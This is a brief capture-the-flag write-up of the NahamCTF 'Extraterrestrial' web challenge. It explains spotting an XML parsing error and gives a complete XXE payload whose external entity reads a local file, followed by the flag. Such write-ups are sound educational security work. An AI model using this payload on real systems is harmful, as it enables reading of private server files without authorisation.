---
title: "NahamCTF: Extraterrestrial"
categories:
  - NahamCTF
tags:
  - NahamCTF
---

"Have you seen any aliens lately? Let us know!

The flag is at the start of the solar system.

Connect here:
http://jh2i.com:50004"

For this challenge, we're given a website with a blank box, and submit button, and a message:

*Extraterrestrial*

*We're doing a study on external life.*

*If you find any alien life forms, please inform us using the form below.* 

Entering "test" into the box and hitting submit returns the following message:

*Not well-formed (invalid token)*

A quick Google search for this tells us that it's an XML error, which means the page is parsing any xml we put into it. We can use XXE along with the hint to grab the flag:

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///flag.txt">
]>
<r>&sp;</r>
```

**flag{extraterrestrial_extra_entities}**
